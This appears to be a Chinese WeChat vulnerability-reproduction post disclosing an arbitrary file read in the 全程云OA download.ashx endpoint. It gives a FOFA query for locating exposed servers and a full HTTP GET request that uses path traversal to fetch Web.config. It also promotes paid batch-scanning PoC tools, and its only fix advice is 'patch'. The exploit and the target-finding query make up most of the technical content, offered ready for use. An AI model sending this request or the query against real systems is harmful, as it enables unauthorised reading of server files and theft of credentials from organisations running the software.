---
title: 全程云OA download.ashx接口存在任意文件读取漏洞 附POC
url: https://mp.weixin.qq.com/s/LRjrEUoutKGQDj2loGBzxw
source: Doonsec's feed
date: 2026-04-23
fetch_date: 2026-04-24T04:48:04.792972
---

# 全程云OA download.ashx接口存在任意文件读取漏洞 附POC

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/b9KQYsB8q6zMTq2FvLnQPEWmUwEFA1jSOVSOVNFg9ibsDTSZUhLpTCBkTem3Scegrg47IRxjVFTfmEThKSHRRP9xWEgZdSchGvECIwn8UYtU/0?wx_fmt=jpeg)

# 全程云OA download.ashx接口存在任意文件读取漏洞 附POC

2026-4-23更新
2026-4-23更新

南风漏洞复现文库

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。

## 1. 全程云OA简介

微信公众号搜索：南风漏洞复现文库
该文章 南风漏洞复现文库 公众号首发

本人只有 南风漏洞复现文库 和 南风网络安全 这两个公众号，其他公众号有意冒充，请注意甄别，避免上当受骗。

全程云OA

## 2.漏洞描述

全程云OA download.ashx接口存在任意文件读取漏洞

CVE编号:

CNNVD编号:

CNVD编号:

## 3.影响版本

全程云OA
![全程云OA download.ashx接口存在任意文件读取漏洞](https://mmbiz.qpic.cn/mmbiz_jpg/b9KQYsB8q6x9mFQC3hkCwZ7GEdlpFmrvlVjONPJcSiaQprExGm83LxicvFtE2RazRUwOkbZcibnreCT31SwVUoLib3Wib7Y7cDZWWhlHFdVbKSkY/640?wx_fmt=jpeg&from=appmsg "null")

全程云OA download.ashx接口存在任意文件读取漏洞

## 4.fofa查询语句

app="全程云-管理系统"

## 5.漏洞复现

漏洞链接：http://xx.xx.xx.xx/OA/SMS/download.ashx?FilePath=../Web.config

漏洞数据包：

```
GET /OA/SMS/download.ashx?FilePath=../Web.config HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/b9KQYsB8q6z1vz1icI24LBrvhsQOIQR56nibLq3oiaibLeWFZSficsbZvUEibPKGC5npH2uI07gGdULYv2hw5r6Hr6oFPouicr3em3gdATeqiaRZiaD0/640?wx_fmt=jpeg&from=appmsg "null")

## 6.POC&EXP

本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全

1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。

2: 免登录，免费fofa查询。

3: 更新其他实用网络安全工具项目。

4: 免费指纹识别，持续更新指纹库。

5: Nuclei脚本。

![](https://mmbiz.qpic.cn/mmbiz_jpg/b9KQYsB8q6x8VzSFHsDicCzQH19zfyYeoet5kgDjYCms1e0yO13QJ13mdfoZaDtz9wRN3vO4tZBDtxa2RACxeaMYZwZ3XTTCSvtzhm2wevLs/640?wx_fmt=jpeg&from=appmsg "null")

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b9KQYsB8q6wEchUztFVnnfNdAT28tfiaDic0lw7weaI0yyFchhyS7WHC2BQkW62sRcX5YialGhrKFVolUQVUqBibHGhEZNeqraXvmMiazcEuYsKE/640?wx_fmt=jpeg&from=appmsg "null")

![](https://mmbiz.qpic.cn/mmbiz_jpg/b9KQYsB8q6zqicngADpWhkCOoJTFrNUOXKRFluibcnPFPZNYGs9fnq6iaITBeLI4rLs9HAz9MsrExwFicdziaYKey7dc6FffpiacF8ia0EgMSqxl74/640?wx_fmt=jpeg&from=appmsg "null")

![](https://mmbiz.qpic.cn/mmbiz_jpg/b9KQYsB8q6xaUT7w2iakRHJHLeTbv57V4Uc0pKl5Rex3HhrPT0ZiblIrr2PuwRibyV5aKw0NySkeK1rZoHBU5iaDibiaPnONjX4AInRwdDBxwNFeI/640?wx_fmt=jpeg&from=appmsg "null")

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b9KQYsB8q6y6UCicJuV9QgeJ8uReWKnldiau52BDTNDiaycW4aE1qFCwVc7icGJlgRzV8GOKhZD4rhJCnDasyNHOdVibuj7j6xKkf8uQBDoFRicQI/640?wx_fmt=jpeg&from=appmsg "null")

![](https://mmbiz.qpic.cn/mmbiz_jpg/b9KQYsB8q6xr2DdTswYGiazJyXwL98NjlX1ibMvDRh5JF0TN4RBgKoq5lg9J2YXraOUMey6WLGeRibV6t4AmjfZh76e9XHeW31XNLsZiaNWKGBU/640?wx_fmt=jpeg&from=appmsg "null")

## 7.整改意见

打补丁

## 8.往期回顾

[天地伟业Easy7 uploadFile接口存在任意文件上传漏洞 附POC](https://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247490312&idx=1&sn=4aa4ee686a8d6579cf0bc6112c482a67&scene=21#wechat_redirect)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/HsJDm7fvc3a95GFchUA48sGQuaFpFPPmL593YvcFo4IPeV2QPL2L72h5t4ibNq9IyXI9GmRWmvV2eh8zo3ldtmg/0?wx_fmt=png)

南风漏洞复现文库

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/HsJDm7fvc3a95GFchUA48sGQuaFpFPPmL593YvcFo4IPeV2QPL2L72h5t4ibNq9IyXI9GmRWmvV2eh8zo3ldtmg/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过